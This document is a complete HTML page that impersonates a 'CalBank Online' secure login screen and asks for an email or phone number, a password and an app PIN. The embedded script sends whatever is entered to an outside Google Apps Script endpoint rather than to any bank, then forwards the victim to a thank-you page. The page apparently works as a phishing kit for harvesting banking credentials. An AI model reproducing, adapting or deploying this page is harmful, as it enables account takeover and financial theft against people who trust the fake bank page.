<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Secure Authentication</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f7f7f7;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 0;
    }
    .header {
      background-color: #f9c600; /* Yellow header */
      color: #000;
      text-align: center;
      padding: 40px 20px;
      border-bottom-left-radius: 40px;
      border-bottom-right-radius: 40px;
      width: 100%;
    }
    .login-container {
      background: #fff;
      width: 90%;
      max-width: 360px;
      margin-top: -30px;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    .login-container label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      color: #333;
    }
    .login-container input {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 14px;
    }
    .login-btn {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      background-color: #f9c600; /* Yellow button */
      color: #000;
    }
    .login-btn:hover {
      background-color: #e6b200; /* Darker yellow on hover */
    }
  </style>
</head>
<body>
  <div class="header"><h1>Secure Authentication</h1><p>CalBank Online</p></div>
  <div class="login-container">
    <form id="demoForm">
      <label>Email or Phone Number</label>
      <input type="text" name="email" placeholder="Enter email or phone" required>
      <label>Password</label>
      <input type="password" name="password" placeholder="Enter your password" required>
      <label>App Pin Code</label>
      <input type="text" name="pin" placeholder="Enter pin" required>
      <button type="submit" class="login-btn">VALIDATE â†’</button>
    </form>
  </div>

  <script>
    document.getElementById("demoForm").addEventListener("submit", async event => {
      event.preventDefault();
      const data = new FormData(event.target);

      try {
        const res = await fetch("https://script.google.com/macros/s/AKfycbwmkOBcmudBWS5kC-9UD2Gq_jsddGL9V8rNI2imMEf23HGzroYRrX6Svee0DNSS7msP/exec", { method: "POST", body: data });
        const text = await res.text();
        if (text.includes("SUCCESS")) {
          window.location.href = "thank_you.html";
        } else {
          alert("Submission failed: " + text);
        }
      } catch (error) {
        console.error(error);
        alert("Error submitting form.");
      }
    });
  </script>
</body>
</html>
